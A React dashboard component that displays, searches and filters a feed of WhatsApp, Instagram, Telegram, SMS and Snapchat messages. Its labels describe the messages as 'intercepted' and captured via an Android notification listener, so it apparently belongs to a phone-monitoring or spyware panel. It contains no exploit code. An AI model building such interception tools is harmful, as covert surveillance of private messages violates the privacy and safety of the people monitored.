import React, { useState } from 'react';
import { MessageSquare, MessageCircle, Send, Search, Instagram, Youtube, Radio, Hash } from 'lucide-react';

export default function SocialFeedTab({ social = [] }) {
  const [selectedApp, setSelectedApp] = useState('ALL');
  const [searchQuery, setSearchQuery] = useState('');

  const getAppMeta = (appName = '') => {
    const lower = appName.toLowerCase();
    if (lower.includes('whatsapp')) {
      return { label: 'WhatsApp', color: 'bg-emerald-500/20 text-emerald-400 border-emerald-800/80', dot: 'bg-emerald-500' };
    }
    if (lower.includes('instagram')) {
      return { label: 'Instagram', color: 'bg-pink-500/20 text-pink-400 border-pink-800/80', dot: 'bg-pink-500' };
    }
    if (lower.includes('telegram')) {
      return { label: 'Telegram', color: 'bg-sky-500/20 text-sky-400 border-sky-800/80', dot: 'bg-sky-500' };
    }
    if (lower.includes('sms') || lower.includes('message')) {
      return { label: 'SMS Messages', color: 'bg-blue-500/20 text-blue-400 border-blue-800/80', dot: 'bg-blue-500' };
    }
    if (lower.includes('snapchat')) {
      return { label: 'Snapchat', color: 'bg-yellow-500/20 text-yellow-400 border-yellow-800/80', dot: 'bg-yellow-500' };
    }
    if (lower.includes('tiktok')) {
      return { label: 'TikTok', color: 'bg-purple-500/20 text-purple-400 border-purple-800/80', dot: 'bg-purple-500' };
    }
    return { label: appName || 'Social App', color: 'bg-slate-800 text-slate-300 border-slate-700', dot: 'bg-slate-400' };
  };

  const filteredFeed = social.filter(item => {
    const matchesSearch = 
      (item.sender || '').toLowerCase().includes(searchQuery.toLowerCase()) ||
      (item.message || '').toLowerCase().includes(searchQuery.toLowerCase());

    if (selectedApp === 'ALL') return matchesSearch;
    return matchesSearch && (item.appName || '').toLowerCase().includes(selectedApp.toLowerCase());
  });

  return (
    <div className="bg-slate-900 border border-slate-800 rounded-2xl p-5 shadow-xl space-y-4">
      
      {/* Header */}
      <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 pb-3 border-b border-slate-800">
        <div>
          <h3 className="font-bold text-base text-slate-100 flex items-center gap-2">
            <MessageCircle className="w-5 h-5 text-emerald-400" />
            <span>Social Media & Messages Feed</span>
          </h3>
          <p className="text-xs text-slate-400">Captured live via Android Notification Listener</p>
        </div>

        {/* Search */}
        <div className="relative w-full sm:w-64">
          <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
          <input
            type="text"
            placeholder="Search chat or sender..."
            value={searchQuery}
            onChange={(e) => setSearchQuery(e.target.value)}
            className="w-full bg-slate-950 border border-slate-800 rounded-xl pl-9 pr-3 py-1.5 text-xs text-slate-100 placeholder-slate-500 focus:outline-none focus:border-emerald-500"
          />
        </div>
      </div>

      {/* App Filters */}
      <div className="flex flex-wrap items-center gap-2">
        {[
          { key: 'ALL', label: `All Messages (${social.length})` },
          { key: 'whatsapp', label: 'WhatsApp' },
          { key: 'instagram', label: 'Instagram' },
          { key: 'telegram', label: 'Telegram' },
          { key: 'sms', label: 'SMS' },
          { key: 'snapchat', label: 'Snapchat' }
        ].map(filter => (
          <button
            key={filter.key}
            onClick={() => setSelectedApp(filter.key)}
            className={`px-3 py-1.5 rounded-lg text-xs font-semibold transition ${
              selectedApp === filter.key
                ? 'bg-emerald-600 text-white shadow-md shadow-emerald-600/20'
                : 'bg-slate-950 border border-slate-800 text-slate-400 hover:text-slate-200'
            }`}
          >
            {filter.label}
          </button>
        ))}
      </div>

      {/* Message Feed Timeline */}
      <div className="space-y-3 max-h-[500px] overflow-y-auto pr-1">
        {filteredFeed.length === 0 ? (
          <div className="text-center py-12 text-slate-500 text-xs">
            No intercepted messages found.
          </div>
        ) : (
          filteredFeed.map((item, idx) => {
            const meta = getAppMeta(item.appName);
            return (
              <div
                key={item.id || idx}
                className="bg-slate-950/70 border border-slate-800/80 rounded-xl p-4 hover:border-slate-700 transition space-y-2 shadow-sm"
              >
                <div className="flex items-center justify-between gap-2">
                  <div className="flex items-center gap-2">
                    <span className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[11px] font-semibold border ${meta.color}`}>
                      <span className={`w-1.5 h-1.5 rounded-full ${meta.dot}`} />
                      {meta.label}
                    </span>
                    <span className="font-semibold text-sm text-slate-200">{item.sender}</span>
                  </div>
                  <span className="text-[10px] text-slate-500 font-mono">{item.timestamp}</span>
                </div>

                <div className="text-xs text-slate-300 bg-slate-900/80 p-2.5 rounded-lg border border-slate-800/60 leading-relaxed font-sans">
                  {item.message}
                </div>
              </div>
            );
          })
        )}
      </div>

    </div>
  );
}
